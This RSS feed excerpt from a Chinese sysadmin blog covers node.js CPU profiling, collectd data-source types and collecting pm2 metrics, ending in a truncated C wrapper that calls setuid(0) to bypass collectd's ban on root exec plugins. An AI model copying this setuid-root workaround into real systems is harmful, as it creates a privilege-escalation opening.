│ Loop delay │ 2.04ms │
│ Loop delay │ 2.3ms  │
│ Loop delay │ 1.76ms │
│ Loop delay │ 1.97ms │
│ Loop delay │ 2.12ms │
│ Loop delay │ 1.98ms │
│ Loop delay │ 2.16ms │
│ Loop delay │ 1.98ms │
│ Loop delay │ 2.07ms │
│ Loop delay │ 1.88ms │
│ Loop delay │ 2.61ms │
│ Loop delay │ 1.84ms │
│ Loop delay │ 1.84ms │
│ Loop delay │ 1.88ms │
</pre>
</div>
</div>

<div id="outline-container-org84a59ad" class="outline-2">
<h2 id="org84a59ad">分析</h2>
<div class="outline-text-2" id="text-org84a59ad">
</div>
<div id="outline-container-org51af83f" class="outline-3">
<h3 id="org51af83f">系统负荷正常</h3>
<div class="outline-text-3" id="text-org51af83f">
<p>
<code>top</code> 的 <code>load average</code> 值远小于 CPU 核数，系统的 CPU 使用率为 25%，还有足够的空闲 CPU 资源。
</p>
</div>
</div>

<div id="outline-container-orgb10f724" class="outline-3">
<h3 id="orgb10f724">node.js 的 CPU 占用过高</h3>
<div class="outline-text-3" id="text-orgb10f724">
<ul class="org-ul">
<li><p>
运行和等待 CPU 时间片的进程数偏高
</p>

<p>
参见 <code>vmstat</code> 的 <code>r</code> 列
</p></li>
</ul>


<ul class="org-ul">
<li><p>
中断数偏多
</p>

<p>
参见 <code>vmstat</code> 的 <code>in</code> 列
</p>

<p>
有可能是网络 I/O 数过多引起，参见 <code>sar</code> 的 <code>iseg/s</code> <code>oseg/s</code> 列。
</p>

<p>
中断数虽多，但并非瓶颈，参见 <code>top</code> 的 <code>%hi</code> 和 <code>%si</code> 值。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
上下文切换较多
</p>

<p>
参见 <code>vmstat</code> 的 <code>cs</code> 列
</p>

<p>
上下文切换数远小于中断数，正常。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
用户模式下 CPU 占用过高
</p>

<p>
超过 50%
</p>

<p>
参见 <code>vmstat</code> 的 <code>us</code> 列
</p></li>

<li><p>
node.js 进程事件循环迟延小于 3ms
</p>

<p>
正常。应用目前还能够提供快速响应。
</p></li>

<li><p>
node.js 进程 CPU 占用过高
</p>

<p>
统计了一天平均占用 65%，高峰占用 85% 以上。
</p>

<p>
参见 <code>ps</code> 输出
</p>

<p>
应用本身是网络密集型，每 node.js 进程每秒钟处理 250 个请求，不存在 CPU 密集操作，这样高的 CPU 占用是不可接受的。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org25f73ef" class="outline-3">
<h3 id="org25f73ef">网络带宽占用正常</h3>
<div class="outline-text-3" id="text-org25f73ef">
<ul class="org-ul">
<li><p>
对外的网卡
</p>

<p>
上行 27Mbps，下行 66Mbps
</p>

<p>
主要是来自设备和客户端的流量。
</p></li>

<li><p>
对内的网卡
</p>

<p>
上行 18.7Mbps，下行 21.7Mbps
</p>

<p>
主要是内部通信流量（redis）。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgf3bdbe0" class="outline-3">
<h3 id="orgf3bdbe0">磁盘访问较少</h3>
<div class="outline-text-3" id="text-orgf3bdbe0">
<p>
应用除了写少量日志外不访问磁盘。
</p>
</div>
</div>

<div id="outline-container-orge098b99" class="outline-3">
<h3 id="orge098b99">结论</h3>
<div class="outline-text-3" id="text-orge098b99">
<ul class="org-ul">
<li>系统资源不存在瓶颈</li>

<li>系统当前的运行状况良好</li>

<li><p>
node.js 应用的 CPU 占用偏高
</p>

<p>
需要对 node.js 应用进行性能分析及优化
</p></li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org426cafc" class="outline-2">
<h2 id="org426cafc">node.js 应用性能分析</h2>
<div class="outline-text-2" id="text-org426cafc">
<p>
node.js 从 4.4.0 版本开始内置了 profiler， <code>--prof</code> 命令选项运行应用会在当前目录生成性能日志文件。
</p>

<p>
解读性能日志文件
</p>
<pre class="example">
# node --prof-process isolate-0x1d1e1b0-v8-10041.log
...
[Summary]:
   ticks  total  nonlib   name
    348    7.3%    7.6%  JavaScript
   4243   88.8%   92.4%  C++
     63    1.3%    1.4%  GC
    184    3.9%          Shared libraries
      2    0.0%          Unaccounted
...
 [C++ entry points]:
   ticks    cpp   total   name
    494   19.4%   10.3%  v8::internal::Runtime_DateCurrentTime(int, v8::internal::Object**, v8::internal::Isolate*)
...
   ticks parent  name
   1739   36.4%  syscall

    586   12.3%  __lll_lock_wait
    413   70.5%    v8::internal::Runtime_DateCurrentTime(int, v8::internal::Object**, v8::internal::Isolate*)
    398   96.4%      LazyCompile: *now native date.js:197:17
    305   76.6%        LazyCompile: *&lt;anonymous&gt; /usr/local/xxxxx.xxxxxxxx.com/src/models.js:43:30
...
</pre>

<p>
最大头的时间花在系统调用上，通过 strace 工具统计 node.js 进程 10 秒钟的系统调用计数
</p>
<pre class="example">
12259 write
10501 read
 9261 epoll_ctl
 1564 epoll_wait
  503 close
  502 recvmsg
  502 getsockopt
  502 getsockname
  103 futex
   23 stat
    6 writev
    1 getpeername
</pre>

<p>
系统调用主要进行网络 I/O ，如：与设备通信（TLS 长连接）、与客户端通信（HTTP 短连接）、与Redis通信（TCP 长连接）。
</p>

<p>
其它调用出现次数最多的是获取当前时间戳的函数 models.js:43：
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getTimestamp</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> Math.floor(Date.now() / 1000);
}
</pre>
</div>

<p>
它会在很多地方被用到，如：当从 redis 收到一条订阅的消息时，会在消息中添加当前时间戳，方便后面处理。
</p>

<p>
可以通过缓存减少这部分开销：
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getTimestamp</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (! getTimestamp._timestamp) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   getTimestamp._timestamp = Math.floor(Date.now() / 1000);

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   setInterval(<span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   getTimestamp._timestamp = Math.floor(Date.now() / 1000);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }, 1000).unref();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> getTimestamp._timestamp;
}
getTimestamp._timestamp = 0;
</pre>
</div>

<p>
上面的代码，虽然调用次数相对较多，但并不耗 CPU，经过上面的优化后，总系统 CPU 占用只是略有减少。
</p>

<p>
关键的系统调用消耗难以再优化，在我们的应用中，node.js 单实例处理能力的上限：4K TLS 长连接（平均 CPU 占用 85%）。
</p>

<p>
最终决定，增加服务器上 node.js 进程的数量，node.js 最大连接数限制（ <a href="https://nodejs.org/api/net.html#net_server_maxconnections">net.maxConnections</a> ）进一步减少。
</p>
</div>
</div>

<div id="outline-container-orgeb75a18" class="outline-2">
<h2 id="orgeb75a18">参考</h2>
<div class="outline-text-2" id="text-orgeb75a18">
<p>
<a href="http://www.ruanyifeng.com/blog/2011/07/linux_load_average_explained.html">理解Linux系统负荷 - 阮一峰的网络日志</a>
</p>

<p>
<a href="http://www.blogjava.net/sliverfancy/archive/2013/04/17/397947.html">Linux-Load Average解析(转) - java技术研究 - BlogJava</a>   
</p>

<p>
<a href="http://www.trueeyu.com/?p=1749">linux系统性能监控与优化（2）–cpu | 小鳄的笔记本</a>
</p>

<p>
<a href="https://nodejs.org/en/docs/guides/simple-profiling/">Easy profiling for Node.js Applications | Node.js</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[collectd 数据类型详解]]></title>
            <link>/article/collectd-6570636e7c7b578b8be689e3.html</link>
            <guid>/article/collectd-6570636e7c7b578b8be689e3.html</guid>
            <pubDate>Sat, 07 May 2016 07:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="https://collectd.org/documentation/manpages/collectd-exec.5.shtml">man 5 collectd-exec</a>
</p>
<blockquote>
<p>
type identifies the type and number of values (i. e. data-set) passed to collectd. A large list of predefined data-sets is available in the types.db file. See types.db(5) for a description of the format of this file.
</p>
</blockquote>
<blockquote>
<p>
type 标识传给 collectd 的值的类型和数量（即数据集）。types.db 中预定义了大量数据集（data-sets）。types.db 的格式描述可以查看 types.db(5) 手册。
</p>
</blockquote>

<p>
<a href="https://collectd.org/documentation/manpages/types.db.5.shtml">man 5 types.db</a>
</p>
<blockquote>
<p>
The types.db file contains one line for each data-set specification. Each line consists of two fields delimited by spaces and/or horizontal tabs. The first field defines the name of the data-set, while the second field defines a list of data-source specifications, delimited by spaces and, optionally, a comma (",") right after each list-entry.
</p>

<p>
The format of the data-source specification has been inspired by RRDtool's data-source specification. Each data-source is defined by a quadruple made up of the data-source name, type, minimal and maximal values, delimited by colons (":"): ds-name:ds-type:min:max. ds-type may be either ABSOLUTE, COUNTER, DERIVE, or GAUGE. min and max define the range of valid values for data stored for this data-source. If U is specified for either the min or max value, it will be set to unknown, meaning that no range checks will happen. See rrdcreate(1) for more details.
</p>
</blockquote>
<blockquote>
<p>
types.db 文件每行定义一种数据集（data-set），为空格或水平制表符分隔的两个字段。第一个字段定义数据集名称，第二字段定义数据源规格列表，列表条目用空格或逗号分隔。
</p>

<p>
数据源规格受到 RRDtool 启发。每一数据源定义为四元组，依次是名称、类型、最小值、最大值，使用冒号分隔：ds-name:ds-type:min:max。ds-type 可取 ABSOLUTE、COUNTER、DERIVE、GAUGE 之一。min 和 max 定义有效的取值范围，可以指定 min 或 max 为未知 U，表示不检查取值范围。查阅 rrdcreate(1) 手册了解更多。
</p>
</blockquote>

<p>
<a href="https://collectd.org/wiki/index.php/Data_source">Data source - collectd Wiki</a>
</p>
<blockquote>
<p>
Data source types
</p>

<p>
There are four data source types which are basically identical to the data source types of the same name in RRDtool:
</p>

<p>
GAUGE
</p>

<p>
A GAUGE value is simply stored as-is. This is the right choice for values which may increase as well as decrease, such as temperatures or the amount of memory used.
</p>


<p>
DERIVE
</p>

<p>
These data sources assume that the change of the value is interesting, i.e. the derivative. Such data sources are very common with events that can be counted, for example the number of emails that have been received by an MTA since it was started. The total number of emails is not interesting, but the change since the value has been read the last time. The value is therefore converted to a rate using the following formula:
</p>

<p>
rate = (value_new - value_old) / (time_new - time_old)
</p>

<p>
Please note that if value_new &lt; value_old, the resulting rate will be negative. If you set the minimum value to zero, such data points will be discarded. Using DERIVE data sources and a minimum value of zero is recommended for counters that rarely overflow, i.e. wrap-around after their maximum value has been reached. This data source type is available since version 4.8.
</p>


<p>
COUNTER
</p>

<p>
These data sources behave exactly like DERIVE data sources in the “normal” case. Their behavior differs when value_new &lt; value_old, i.e. when the new value is smaller than the previous value. In this case, COUNTER data sources will assume the counter “wrapped around” and take this into account. The formula for wrap-around cases is:
</p>

<p>
rate = (2**width - value_old + value_new) / (time_new - time_old)
width = value_old &lt; 2**32 ? 32 : 64
</p>

<p>
Please note that the rate of a COUNTER data source is never negative. If a counter is reset to zero, for example because an application was restarted, the wrap-around calculation may result in a huge rate. Thus setting a reasonable maximum value is essential when using COUNTER data sources. Because of this, COUNTER data sources are only recommended for counters that wrap-around often, for example 32 bit octet counters of a busy switch port.
</p>


<p>
ABSOLUTE
</p>

<p>
This is probably the most exotic type: It is intended for counters which are reset upon reading. In effect, the type is very similar to GAUGE except that the value is an (unsigned) integer and will be divided by the time since the last reading. This data source type is available since version 4.8 and has been added mainly for consistency with the data source types available in RRDtool.
</p>
</blockquote>
<blockquote>
<p>
数据源类型
</p>

<p>
源自 RRDtool 的四种数据源类型：
</p>

<p>
GAUGE
</p>

<p>
GAUGE 意为计量，其值简单地原样存储。用于可增减的值，如：温度或费用支出。
</p>


<p>
DERIVE
</p>

<p>
DERIVE 意为导数，关注值的变动，即导数。
这样的数据源通常为可计数的事件，如：邮件客户端启动后收到的邮件数。
相对于收件箱里的邮件总数，上次查看邮箱后新收到的邮件数量更值得关注。
该值可以根据以下公式转化为速率：
</p>

<p>
rate = (value_new - value_old) / (time_new - time_old)
</p>

<p>
如果 value_new 小于 value_old，得出的 rate 为负。
如果设置最小值（min）为 0 ，这个数据点将被丢弃。
对于很少溢出（即达到最大值后回绕）的计数器推荐使用 DERIVE 数据源并设置最小值（min）为 0。
DERIVE 类型从 4.8 版本开始提供。
</p>


<p>
COUNTER
</p>

<p>
COUNTER 意为计数器，”正常“情况下与 DERIVE 一样。
细微的差异在于当 value_new 小于 value_old 时，COUNTER 数据源类型假设计数器已经“回绕”，计算速率的公式：
</p>

<p>
rate = (2**width - value_old + value_new) / (time_new - time_old)
width = value_old &lt; 2**32 ? 32 : 64
</p>

<p>
COUNTER 数据源类型计算出的速率（rate）值不为负。
如果计数器被重置为 0，如当应用程序重启后，回绕计算可能导致结果为巨大的速率（rate）。
当使用 COUNTER 数据源时，必须设置一个合理的最大值（max）。
因此，COUNTER 数据源仅推荐用于常常会回绕的计数器，例如，繁忙的交换机端口的 32 位字节计数器。
</p>


<p>
ABSOLUTE
</p>

<p>
ABSOLUTE 意为绝对，可能是最特殊的类型：用于读取后会重置的计数器。
效果上，它和 GAUGE 类型非常相似，除了它的值是无符号整型，还要与上次读取至今的时间相除。
</p>

<p>
这个数据源类型从 4.8 版本开始提供，主要是为了和 RRDtool 保持一致。
</p>
</blockquote>

<ul class="org-ul">
<li><p>
数据集（Data Set）
</p>

<p>
传递到 collectd 的数据的定义，如 types.db 中的一条：
</p>
<pre class="example">
load            shortterm:GAUGE:0:5000, midterm:GAUGE:0:5000, longterm:GAUGE:0:5000
</pre>

<p>
以上定义了一种数据集，名为 load，包括三个值：shortterm、midterm、longterm，这三个值的类型都是 GAUGE，取值范围 0-5000。
</p>

<p>
详情参见 <a href="https://collectd.org/wiki/index.php/Data_set">Data set - collectd Wiki</a>
</p></li>

<li><p>
数据源（Data Source）
</p>

<p>
就是数据集（Data Set）的值定义，为名称、类型、最小值、最大值四元组。
</p></li>

<li><p>
数据源类型（Data Source Type）
</p>

<p>
就是数据源中的类型字段，共有四种类型：ABSOLUTE、COUNTER、DERIVE、GAUGE。
</p></li>
</ul>

<div id="outline-container-org270fc87" class="outline-2">
<h2 id="org270fc87">示例</h2>
<div class="outline-text-2" id="text-org270fc87">
<p>
以下 collectd-exec 插件示例脚本用到了 load 数据集
</p>
<pre class="example">
#!/bin/bash

HOSTNAME="${COLLECTD_HOSTNAME:-localhost}"
INTERVAL="${COLLECTD_INTERVAL:-60}"

while [ 1 ]; do
    echo "PUTVAL \"$HOSTNAME/test_load/load\" interval=$INTERVAL N:1:2:3"
    sleep "$INTERVAL"
done
</pre>

<p>
插件名称 <code>test_load</code> ，数据类型（数据集）为 <code>load</code> ， <code>N</code> 代指当前时间，shortterm、midterm、longterm 的值分别为 1、2、3。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 collectd 监控 pm2 应用性能]]></title>
            <link>/article/4f7f7528-collectd-76d163a7-pm2-5e947528602780fd.html</link>
            <guid>/article/4f7f7528-collectd-76d163a7-pm2-5e947528602780fd.html</guid>
            <pubDate>Thu, 05 May 2016 08:45:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="https://github.com/Unitech/pm2">pm2</a> 是 node.js 应用的产品级进程管理器。
</p>

<blockquote>
<p>
PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.
</p>
</blockquote>

<div id="outline-container-org7c2c5d4" class="outline-2">
<h2 id="org7c2c5d4">关键性能指标</h2>
<div class="outline-text-2" id="text-org7c2c5d4">
<p>
通过 <a href="https://github.com/Unitech/pm2">pm2</a> 可以获取到 node.js 应用的几个关键性能指标：
</p>

<ul class="org-ul">
<li><p>
Memory used
</p>

<p>
node.js 应用的内存占用。
</p>

<p>
node.js（v8） 通过垃圾收集（GC）技术进行自动内存管理，这里测量到的内存占用还包含一部分未回收的垃圾。
</p></li>

<li><p>
CPU used
</p>

<p>
node.js 应用的 CPU 占用。
</p>

<p>
node.js 是单线程模型，虽然所有 I/O 操作是异步的，但是代码指令执行是同步的，过多的请求处理或消耗 CPU 的操作会导致应用响应速度变慢，可能无法提供正常的服务。
</p></li>

<li><p>
Loop delay
</p>

<p>
node.js 应用事件循环的延迟。
</p>

<p>
pm2 测量 node.js 应用 Loop delay 的逻辑如下：
</p>

<blockquote>
<p>
记下开始时间（ process.hrtime ）
</p>

<p>
设置 1 秒钟的定时器（setInterval）
</p>

<p>
定时器触发时获取结束时间（ process.hrtime ）
</p>

<p>
结束时间与开始时间的时间差减去 1 秒钟就是 Loop delay
</p>
</blockquote>
<p>
具体实现请查阅 pm2 源代码：node_modules/pm2/node_modules/pmx/lib/probes/pacemaker.js
</p></li>
</ul>


<p>
一般来说 <code>Loop delay</code> 与 <code>CPU used</code> 指标是正相关的，但是如果 node.js 应用不小心调用了一些同步 I/O 操作或 I/O 出现瓶颈，则会出现 <code>CPU used</code> 低但是 <code>Loop delay</code> 高的情况。
</p>

<ul class="org-ul">
<li><p>
restart_time 及 unstable_restarts
</p>

<p>
node.js（javascript）是一门动态语言，很少运行到的代码分支里一个错误的变量引用就可能导致整个应用异常退出，pm2 会在 node.js 应用退出时自动重新拉起应用，
但这可能会掩盖潜藏的问题（BUG），监控 node.js 应用的重启次数可以及时发现这种问题（BUG）。
</p></li>
</ul>

<p>
上线新代码后，通过观测这几个关键性能指标，以及与历史记录进行对比，可以用来评估新代码的运行效率与质量。
</p>
</div>
</div>

<div id="outline-container-orgd0ecdd6" class="outline-2">
<h2 id="orgd0ecdd6">收集性能指标</h2>
<div class="outline-text-2" id="text-orgd0ecdd6">
<p>
通过 pm2 收集 node.js 应用性能指标的脚本 <code>/usr/local/bin/collectd-pm2.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">os</span> = require(<span style="color: #8abeb7;">'os'</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">exec</span> = require(<span style="color: #8abeb7;">'child_process'</span>).exec;


<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">hostname</span> = process.env.COLLECTD_HOSTNAME || os.hostname();
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">interval</span> = parseInt(process.env.COLLECTD_INTERVAL, 10) || 1;

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">collect</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   exec(<span style="color: #8abeb7;">'pm2 jlist'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">error</span>, <span style="color: #f0c674;">stdout</span>, <span style="color: #f0c674;">stderr</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (error) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stderr.write(error.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.exit(1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (stderr) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stderr.write(stderr.toString() + <span style="color: #8abeb7;">"\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">timestamp</span> = Math.floor(Date.now() / 1000);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">list</span> = JSON.parse(stdout);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   list.forEach(<span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">item</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">name</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">i</span> = 0, <span style="color: #f0c674;">n</span> = item.name.length; i &lt; n; ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   name += item.name[i].match(<span style="color: #8abeb7;">/^[0-9a-zA-Z]+$/</span>) ? item.name[i] : <span style="color: #8abeb7;">'_</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">;</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stdout.write(<span style="color: #8abeb7;">"PUTVAL \""</span> + hostname + <span style="color: #8abeb7;">"/"</span> + name + <span style="color: #8abeb7;">"-loop_de</span><span style="color: #8abeb7; text-decoration: underline;">lay"</span><span style="text-decoration: underline;"> + </span><span style="color: #8abeb7; text-decoration: underline;">"/delay-"</span><span style="text-decoration: underline;"> + item.pm_id + </span><span style="color: #8abeb7; text-decoration: underline;">"\" interval="</span><span style="text-decoration: underline;"> + interval + </span><span style="color: #8abeb7; text-decoration: underline;">" "</span><span style="text-decoration: underline;"> + timestamp + </span><span style="color: #8abeb7; text-decoration: underline;">":"</span><span style="text-decoration: underline;"> + item.pm2_env.axm_monitor[</span><span style="color: #8abeb7; text-decoration: underline;">"Loop delay"</span><span style="text-decoration: underline;">].value.replace(</span><span style="color: #8abeb7; text-decoration: underline;">'ms'</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">) + </span><span style="color: #8abeb7; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stdout.write(<span style="color: #8abeb7;">"PUTVAL \""</span> + hostname + <span style="color: #8abeb7;">"/"</span> + name + <span style="color: #8abeb7;">"-memory_</span><span style="color: #8abeb7; text-decoration: underline;">used"</span><span style="text-decoration: underline;"> + </span><span style="color: #8abeb7; text-decoration: underline;">"/gauge-"</span><span style="text-decoration: underline;"> + item.pm_id + </span><span style="color: #8abeb7; text-decoration: underline;">"\" interval="</span><span style="text-decoration: underline;"> + interval + </span><span style="color: #8abeb7; text-decoration: underline;">" "</span><span style="text-decoration: underline;"> + timestamp + </span><span style="color: #8abeb7; text-decoration: underline;">":"</span><span style="text-decoration: underline;"> + item.monit.memory + </span><span style="color: #8abeb7; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stdout.write(<span style="color: #8abeb7;">"PUTVAL \""</span> + hostname + <span style="color: #8abeb7;">"/"</span> + name + <span style="color: #8abeb7;">"-cpu_use</span><span style="color: #8abeb7; text-decoration: underline;">d"</span><span style="text-decoration: underline;"> + </span><span style="color: #8abeb7; text-decoration: underline;">"/gauge-"</span><span style="text-decoration: underline;"> + item.pm_id + </span><span style="color: #8abeb7; text-decoration: underline;">"\" interval="</span><span style="text-decoration: underline;"> + interval + </span><span style="color: #8abeb7; text-decoration: underline;">" "</span><span style="text-decoration: underline;"> + timestamp + </span><span style="color: #8abeb7; text-decoration: underline;">":"</span><span style="text-decoration: underline;"> + item.monit.cpu + </span><span style="color: #8abeb7; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stdout.write(<span style="color: #8abeb7;">"PUTVAL \""</span> + hostname + <span style="color: #8abeb7;">"/"</span> + name + <span style="color: #8abeb7;">"-restart</span><span style="color: #8abeb7; text-decoration: underline;">_time"</span><span style="text-decoration: underline;"> + </span><span style="color: #8abeb7; text-decoration: underline;">"/gauge-"</span><span style="text-decoration: underline;"> + item.pm_id + </span><span style="color: #8abeb7; text-decoration: underline;">"\" interval="</span><span style="text-decoration: underline;"> + interval + </span><span style="color: #8abeb7; text-decoration: underline;">" "</span><span style="text-decoration: underline;"> + timestamp + </span><span style="color: #8abeb7; text-decoration: underline;">":"</span><span style="text-decoration: underline;"> + item.pm2_env.restart_time + </span><span style="color: #8abeb7; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stdout.write(<span style="color: #8abeb7;">"PUTVAL \""</span> + hostname + <span style="color: #8abeb7;">"/"</span> + name + <span style="color: #8abeb7;">"-unstabl</span><span style="color: #8abeb7; text-decoration: underline;">e_restarts"</span><span style="text-decoration: underline;"> + </span><span style="color: #8abeb7; text-decoration: underline;">"/gauge-"</span><span style="text-decoration: underline;"> + item.pm_id + </span><span style="color: #8abeb7; text-decoration: underline;">"\" interval="</span><span style="text-decoration: underline;"> + interval + </span><span style="color: #8abeb7; text-decoration: underline;">" "</span><span style="text-decoration: underline;"> + timestamp + </span><span style="color: #8abeb7; text-decoration: underline;">":"</span><span style="text-decoration: underline;"> + item.pm2_env.unstable_restarts + </span><span style="color: #8abeb7; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   setTimeout(collect, interval*1000);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}

collect();
</pre>
</div>

<p>
pm2 是使用 root 帐号运行的，collectd exec 插件不允许以 root 权限运行收集统计的程序（collectd-pm2.js），一个简单的方法是用 c 写一个包裹程序，使用 <code>setuid</code> 切换到 root 帐号。
</p>

<p>
<code>collectd-pm2-root.c</code>
</p>
<div class="org-src-container">
<pre class="src src-c"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdio.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;sys/types.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;sys/stat.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;sys/wait.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;unistd.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdlib.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;signal.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;string.h&gt;</span>


<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">argv</span>[]) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (setuid(0) == -1 || setgid(0) == -1) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> perror(<span style="color: #8abeb7;">"setuid or setgid to root user error"</span>);
